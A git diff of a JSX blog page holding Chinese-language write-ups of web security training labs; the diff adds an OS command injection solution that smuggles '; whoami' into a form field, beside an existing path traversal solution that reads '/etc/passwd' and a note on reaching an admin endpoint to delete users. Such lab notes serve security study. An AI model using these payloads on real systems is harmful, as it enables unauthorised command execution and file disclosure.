@@ -94,6 +94,10 @@ export default function Post() {
                 `}
             />
             <X.P>`192.168.0.13:8080/admin`返回`200`。删除用户同上。</X.P>
+            <X.H1>OS command injection</X.H1>
+            <X.H2>Ap: OS command injection, simple case</X.H2>
+            <X.P>提示了网站会用参数直接执行shell脚本，所以：</X.P>
+            <X.CodeBlock language="python" code={`resp = requests.post(url, data={"productId": 1, "storeId": "; whoami"})`} />
             <X.H1>Path traversal</X.H1>
             <X.H2>Ap: File path traversal, simple case</X.H2>
             <X.P>随便检查一个图片，地址为`/image?filename=23.jpg`，改为`/txt?filename=../../../etc/passwd`即可。</X.P>
